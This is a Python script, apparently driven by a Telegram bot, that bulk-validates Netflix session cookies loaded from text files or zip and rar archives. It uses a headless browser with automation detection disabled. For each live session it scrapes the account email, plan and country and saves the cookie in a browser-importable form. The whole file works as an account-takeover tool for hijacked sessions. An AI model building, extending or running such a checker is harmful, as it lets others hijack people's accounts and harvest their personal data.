import os
import json
import re
import shutil
import uuid
import zipfile
import threading
from concurrent.futures import ThreadPoolExecutor
from http.cookies import SimpleCookie
from bs4 import BeautifulSoup
import certifi
import rarfile

# --- Playwright Imports ---
from playwright.sync_api import sync_playwright, TimeoutError as PlaywrightTimeoutError

# --- Basic Setup ---
os.environ['REQUESTS_CA_BUNDLE'] = certifi.where()
stop_flag = False
SECURE_HTTPONLY_NAMES = {"NetflixId", "SecureNetflixId"}

# --- Thread-safe counters and a set for tracking saved emails ---
check_lock = threading.Lock()
valid_count = 0
invalid_count = 0
checked_count = 0
saved_emails = set()

# Global variable to store temp directory path
temp_results_dir = None

def log(text):
    """Simple logging function for console output"""
    print(text)

def get_emails_from_folder(folder_path):
    """Scans the valid cookies folder and extracts emails from filenames."""
    if not os.path.exists(folder_path):
        os.makedirs(folder_path)
        return set()

    existing_emails = set()
    email_pattern = re.compile(r'\[([^\]]+)\]\[([^\]]+@[^\]]+)\]')
    
    for filename in os.listdir(folder_path):
        match = email_pattern.search(filename)
        if match:
            email = match.group(2)
            existing_emails.add(email)
            
    return existing_emails

def extract_netflix_plan(html_content: str) -> str:
    """
    Enhanced plan extraction with multiple fallback methods
    """
    plan = "Unknown"
    
    # Method 1: Look for "Premium plan" text in HTML
    if 'Premium plan' in html_content or 'premium plan' in html_content.lower():
        return 'Premium'
    elif 'Standard plan' in html_content or 'standard plan' in html_content.lower():
        return 'Standard'
    elif 'Basic plan' in html_content or 'basic plan' in html_content.lower():
        return 'Basic'
    elif 'Mobile plan' in html_content or 'mobile plan' in html_content.lower():
        return 'Mobile'
    
    # Method 2: Try BeautifulSoup parsing
    try:
        soup = BeautifulSoup(html_content, "html.parser")
        
        # Look for h3 with plan info
        h3_tags = soup.find_all('h3')
        for tag in h3_tags:
            text = tag.get_text().lower()
            if 'premium' in text:
                return 'Premium'
            elif 'standard' in text:
                return 'Standard'
            elif 'basic' in text:
                return 'Basic'
            elif 'mobile' in text:
                return 'Mobile'
                
        # Look for divs with plan class
        plan_divs = soup.find_all('div', class_=re.compile('plan', re.I))
        for div in plan_divs:
            text = div.get_text().lower()
            if 'premium' in text:
                return 'Premium'
            elif 'standard' in text:
                return 'Standard'
            elif 'basic' in text:
                return 'Basic'
            elif 'mobile' in text:
                return 'Mobile'
    except:
        pass
    
    # Method 3: Regex patterns
    try:
        patterns = [
            r'data-uia="plan-label"><b>([^<]+)</b>',
            r'"planName":"([^"]+)"',
            r'class="[^"]*plan[^"]*"[^>]*>([^<]+)',
            r'<h3[^>]*>([^<]*plan[^<]*)</h3>'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, html_content, re.IGNORECASE)
            if match:
                potential_plan = match.group(1).strip()
                if 'premium' in potential_plan.lower():
                    return 'Premium'
                elif 'standard' in potential_plan.lower():
                    return 'Standard'
                elif 'basic' in potential_plan.lower():
                    return 'Basic'
                elif 'mobile' in potential_plan.lower():
                    return 'Mobile'
    except:
        pass
    
    return plan if plan != "Unknown" else "NULL"

def extract_email_from_html(html_content: str) -> str:
    """
    Extract email from HTML content with multiple methods
    """
    # Method 1: Direct regex search
    email_pattern = r'\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,7}\b'
    emails = re.findall(email_pattern, html_content)
    
    # Filter out common false positives
    for email in emails:
        if not any(x in email.lower() for x in ['example', 'test', 'netflix', 'support', 'help']):
            return email
    
    # Method 2: Look in JSON data
    try:
        json_pattern = r'"email"\s*:\s*"([^"]+@[^"]+)"'
        match = re.search(json_pattern, html_content)
        if match:
            return match.group(1)
    except:
        pass
    
    return 'N/A'

class NetflixCookieChecker:
    """
    Handles cookie validation and info extraction with Playwright using precise locators.
    """
    def get_country_name(self, country_code):
        country_map = {
            'US': 'USA', 'CA': 'Canada', 'GB': 'UK', 'DE': 'Germany', 'FR': 'France',
            'IT': 'Italy', 'ES': 'Spain', 'AU': 'Australia', 'JP': 'Japan',
            'BR': 'Brazil', 'MX': 'Mexico', 'IN': 'India', 'NL': 'Netherlands'
        }
        return country_map.get(country_code.upper(), country_code)

    def validate_and_get_info(self, cookie_dict):
        with sync_playwright() as p:
            browser = None
            try:
                browser = p.chromium.launch(headless=True, args=["--disable-blink-features=AutomationControlled"])
                context = browser.new_context(
                    user_agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
                )
                
                playwright_cookies = [{"name": name, "value": str(value), "domain": ".netflix.com", "path": "/"} for name, value in cookie_dict.items()]
                context.add_cookies(playwright_cookies)
                
                page = context.new_page()
                page.goto('https://www.netflix.com/browse', timeout=25000, wait_until='domcontentloaded')
                
                # If the URL is the login page, the cookie is invalid.
                if "login" in page.url or "signup" in page.url:
                    return False, {"error": "Invalid Cookie (Redirected to Login)"}
                
                info = {'email': 'N/A', 'plan': 'N/A', 'country': 'N/A', 'extra_member': 'false'}

                # --- 1. Get Plan from Account Page ---
                page.goto('https://www.netflix.com/YourAccount', timeout=25000)
                
                # Method 1: Target the <h3> with the plan name.
                try:
                    plan_element = page.locator('h3:has-text("plan")').first
                    plan_text = plan_element.inner_text(timeout=3000).strip()
                    info['plan'] = plan_text.replace('plan', '').strip()
                except Exception:
                    # Fallback Method: Target the bolded plan name inside a specific element.
                    try:
                        plan_element = page.locator('[data-uia="plan-label"] b').first
                        info['plan'] = plan_element.inner_text(timeout=3000).strip()
                    except Exception as e:
                        log(f"Could not find plan information. Error: {e}")

                # --- 2. Get Email from Security Page ---
                page.goto('https://www.netflix.com/account/security', timeout=25000)
                
                try:
                    email_element = page.locator('[data-uia="account-email"]')
                    info['email'] = email_element.inner_text(timeout=3000).strip()
                except Exception as e:
                    log(f"Could not find email information. Error: {e}")

                # --- 3. Get Other Details ---
                html_content = page.content()
                try:
                    country_match = re.search(r'"currentCountry":"([^"]+)"', html_content)
                    if country_match:
                        info['country'] = self.get_country_name(country_match.group(1))
                except Exception:
                    info['country'] = 'N/A'

                if 'addextramember' in html_content.lower():
                    info['extra_member'] = 'True'
                
                # If plan or email is still missing, do one last generic check
                if info['plan'] == 'N/A' and 'premium' in html_content.lower(): 
                    info['plan'] = 'Premium'
                if info['email'] == 'N/A': 
                    info['email'] = extract_email_from_html(html_content)

                return True, info
                
            except PlaywrightTimeoutError:
                return False, {"error": "Connection Timeout with Playwright"}
            except Exception as e:
                log(f"Playwright Error: {e}")
                return False, {"error": f"An unexpected error occurred: {e}"}
            finally:
                if browser and browser.is_connected():
                    browser.close()

# --- Initialize Checker ---
netflix_checker = NetflixCookieChecker()
def _parse_cookie_header_format(cookie_str: str):
    if ' = ' in cookie_str and ';' not in cookie_str:
        cookie_str = cookie_str.replace(' = ', '=', 1)
    cookie = SimpleCookie()
    cookie.load(cookie_str)
    return {key: morsel.value for key, morsel in cookie.items()}

def parse_cookie_line(cookie_str: str):
    cookie_str = cookie_str.strip()
    if cookie_str.startswith('{'):
        try:
            data = json.loads(cookie_str)
            if isinstance(data, dict) and 'name' in data and 'value' in data:
                return {str(data['name']): str(data['value'])}
        except: 
            pass
    return _parse_cookie_header_format(cookie_str)

def parse_netscape_format(file_content: str):
    cookies = {}
    for line in file_content.splitlines():
        line = line.strip()
        if not line or line.startswith('#'): 
            continue
        try:
            parts = line.split('\t')
            if len(parts) == 7: 
                cookies[parts[5]] = parts[6]
        except: 
            continue
    return cookies if cookies else None

def parse_input_to_cookie_list(file_content: str):
    content = file_content.strip()
    if not content: 
        return []
    lines = content.splitlines()
    first_line = lines[0].strip()

    if first_line.startswith('NetflixId'):
        log("Detected 'NetflixId' start: Processing line-by-line.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]
    elif first_line.startswith('['):
        log("Detected '[' start: Processing as a single JSON array.")
        try:
            data = json.loads(content)
            cookie_dict = {str(i['name']): str(i['value']) for i in data if 'name' in i and 'value' in i}
            return [cookie_dict] if cookie_dict else []
        except:
            log("Error: Failed to parse JSON array.")
            return []
    elif first_line.startswith('.') or first_line.startswith('# Netscape'):
        log("Detected Netscape format.")
        cookie_dict = parse_netscape_format(content)
        return [cookie_dict] if cookie_dict else []
    else:
        log("No specific format detected, attempting simple Key=Value parsing.")
        return [d for d in (parse_cookie_line(line) for line in lines) if d]

def _save_valid_cookie_with_info(cookie_dict, info):
    global temp_results_dir
    filename = (
        f"[{info.get('country', 'N/A')}]"
        f"[{info.get('email', 'N/A')}]"
        f"[{info.get('plan', 'NULL')}]"
        f"[{info.get('extra_member', 'false')}].txt"
    )
    
    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    
    valid_dir = os.path.join(temp_results_dir, 'valid_cookies')
    os.makedirs(valid_dir, exist_ok=True)
    output_path = os.path.join(valid_dir, filename)
    
    payload = []
    for name, value in cookie_dict.items():
        secure = name in SECURE_HTTPONLY_NAMES
        http_only = name in SECURE_HTTPONLY_NAMES
        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})

    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(payload, f, ensure_ascii=False, separators=(',', ': '))
    
    return output_path

def _save_invalid_cookie(cookie_dict, error_message, source_filename="unknown_source"):
    global temp_results_dir
    filename = os.path.basename(source_filename)
    filename = re.sub(r'[<>:"/\\|?*]', '_', filename)
    
    invalid_dir = os.path.join(temp_results_dir, 'invalid_cookies')
    os.makedirs(invalid_dir, exist_ok=True)
    output_path = os.path.join(invalid_dir, filename)

    payload = []
    for name, value in cookie_dict.items():
        secure = name in SECURE_HTTPONLY_NAMES
        http_only = name in SECURE_HTTPONLY_NAMES
        payload.append({"name": name, "value": value, "domain": ".netflix.com", "path": "/", "secure": secure, "httpOnly": http_only})
    
    invalid_data = {
        "error": error_message,
        "source_file": os.path.basename(source_filename),
        "cookie_data": payload
    }

    with open(output_path, 'w', encoding='utf-8') as f:
        json.dump(invalid_data, f, ensure_ascii=False, indent=4)
    
    return output_path

def process_single_cookie(cookie_dict, total_cookies, source_filename="unknown_source"):
    global valid_count, invalid_count, checked_count
    if stop_flag:
        return

    is_valid, info = netflix_checker.validate_and_get_info(cookie_dict)
    
    with check_lock:
        checked_count += 1
        if is_valid:
            email = info.get('email', 'N/A')
            
            if email != 'N/A' and email in saved_emails:
                path = _save_valid_cookie_with_info(cookie_dict, info)
                log(f"🔄 UPDATED: Refreshed cookie for {email}")
            else:
                valid_count += 1
                if email != 'N/A':
                    saved_emails.add(email)
                path = _save_valid_cookie_with_info(cookie_dict, info)
                log(f"💾 NEW: {os.path.basename(path)}")
        else:
            invalid_count += 1
            error_msg = info.get('error', 'Unknown error')
            _save_invalid_cookie(cookie_dict, error_msg, source_filename) 
            log(f"❌ INVALID: {error_msg} (from {os.path.basename(source_filename)})")

        # Update progress
        progress = checked_count / total_cookies
        log(f'Progress: {checked_count}/{total_cookies} | Valid: {valid_count} | Invalid: {invalid_count}')

# --- REVISED: run_check_on_file_list with live support ---
def run_check_on_file_list(file_paths, live=False):
    global temp_results_dir, stop_flag, valid_count, invalid_count, checked_count, saved_emails
    
    stop_flag = False
    valid_count, invalid_count, checked_count = 0, 0, 0
    saved_emails = set()
    
    temp_results_dir = f"temp_results_{uuid.uuid4().hex}"
    os.makedirs(temp_results_dir, exist_ok=True)
    
    cookies_with_sources = [] 

    for file_path in file_paths:
        if stop_flag:
            log("🛑 Process stopped by user during file reading.")
            break
        try:
            log(f"📖 Reading file: {os.path.basename(file_path)}")
            with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                content = f.read()
            
            cookies_from_file = parse_input_to_cookie_list(content)
            if cookies_from_file:
                log(f"  -> Found {len(cookies_from_file)} cookie(s) in this file.")
                for cookie_dict in cookies_from_file:
                    cookies_with_sources.append((cookie_dict, file_path))
            else:
                log(f"  -> No valid cookie formats found in this file.")

        except Exception as e:
            log(f"  -> ❌ Error reading or parsing file {os.path.basename(file_path)}: {e}")
            continue
    
    total_to_check = len(cookies_with_sources)
    if total_to_check == 0:
        log('No valid cookies found in the provided file(s).')
        if live:
            yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
        return temp_results_dir

    log(f'Found a total of {total_to_check} cookies to check across all files.')

    try:
        with ThreadPoolExecutor(max_workers=3) as executor: 
            futures = [executor.submit(process_single_cookie, c_dict, total_to_check, s_path) 
                       for c_dict, s_path in cookies_with_sources]
            for future in futures:
                if stop_flag:
                    executor.shutdown(wait=False, cancel_futures=True)
                    break
                future.result()
                if live:
                    yield (checked_count, total_to_check, valid_count, invalid_count)

        if stop_flag:
            log('⏹️ Checking stopped by user.')
        else:
            log('🎉 Done checking all cookies.')
            log(f'Final Results: Valid: {valid_count} | Invalid: {invalid_count}')

    except Exception as e:
        log(f'Error during check: {e}')
    
    if live:
        yield (checked_count, total_to_check, valid_count, invalid_count, temp_results_dir)
    return temp_results_dir
# --- REVISED: process_file_and_check with live support ---
def process_file_and_check(input_file, live=False):
    """Handles file input, extracts archives if necessary, and starts the check."""
    log('⚙️ Starting process...')
    
    if not input_file or not os.path.exists(input_file):
        log('Error: Please select a valid file first.')
        if live:
            yield (0, 0, 0, 0, None)
        return None

    file_ext = os.path.splitext(input_file)[-1].lower()
    txt_file_paths = []
    extract_dir = f"temp_extract_{uuid.uuid4().hex}"

    try:
        if file_ext == '.txt':
            log(f"Selected single text file: {os.path.basename(input_file)}")
            txt_file_paths.append(input_file)

        elif file_ext == '.zip':
            log(f"📦 ZIP archive detected. Extracting...")
            os.makedirs(extract_dir, exist_ok=True)
            with zipfile.ZipFile(input_file, 'r') as zip_ref:
                zip_ref.extractall(extract_dir)
            log("✅ ZIP extracted. Searching for .txt files...")
            txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]

        elif file_ext == '.rar':
            log(f"📦 RAR archive detected. Extracting...")
            try:
                rarfile.UNRAR_TOOL = "/usr/bin/unrar"
                os.makedirs(extract_dir, exist_ok=True)
                with rarfile.RarFile(input_file, 'r') as rar_ref:
                    rar_ref.extractall(extract_dir)
                log("✅ RAR extracted. Searching for .txt files...")
                txt_file_paths = [os.path.join(root, filename) for root, _, files in os.walk(extract_dir) for filename in files if filename.endswith(".txt")]
            except Exception as e:
                log(f"❌ Failed to extract RAR: {e}")
                if live:
                    yield (0, 0, 0, 0, None)
                return None
        
        else:
            log("Unsupported File: Please select a .txt, .zip, or .rar file.")
            if live:
                yield (0, 0, 0, 0, None)
            return None

        if not txt_file_paths:
            log("❌ No .txt files found to process.")
            if live:
                yield (0, 0, 0, 0, None)
            return None
        
        log(f"Found {len(txt_file_paths)} .txt file(s) to process.")
        results = run_check_on_file_list(txt_file_paths, live=live)
        if live:
            yield from results
        else:
            return results

    finally:
        # Clean up extraction directory
        if os.path.exists(extract_dir):
            shutil.rmtree(extract_dir)

# Main function to be called by telegram bot
def main(file_paths):
    """Main function to be called by the telegram bot"""
    if not file_paths:
        return None
    
    # Process the first file (assuming single file upload)
    results_dir = process_file_and_check(file_paths[0])
    return results_dir

if __name__ == "__main__":
    # Test with local file
    test_files = ["test_cookies.txt"]
    results = main(test_files)
    if results:
        print(f"Results saved to: {results}")

